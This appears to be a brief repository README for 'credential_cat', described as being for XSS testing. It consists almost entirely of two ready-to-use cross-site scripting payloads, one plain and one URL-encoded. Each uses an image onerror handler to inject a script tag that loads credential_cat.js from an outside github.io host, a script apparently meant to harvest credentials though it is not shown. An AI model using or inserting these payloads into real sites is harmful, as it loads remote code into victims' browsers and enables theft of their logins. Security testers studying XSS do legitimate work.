# credential_cat

#### Just for XSS testig

### example payload:
> &lt;img src="jiji://a/404.png" width="1px" height="1px" onerror=" var s = document.createElement('script');s.src = 'https://astals.github.io/credential_cat/credential_cat.js' ;$('head').append(s);"&gt;

> &lt;img src="jiji://a/404.png" width="1px" height="1px" onerror=" var%20s%20%3D%20document.createElement(%27script%27)%3Bs.src%20%3D%20%27https%3A%2F%2Fastals.github.io%2Fcredential_cat%2Fcredential_cat.js%27%3Bdocument.getElementsByTagName(%27head%27)%5B0%5D.appendChild(s)%3B"&gt;
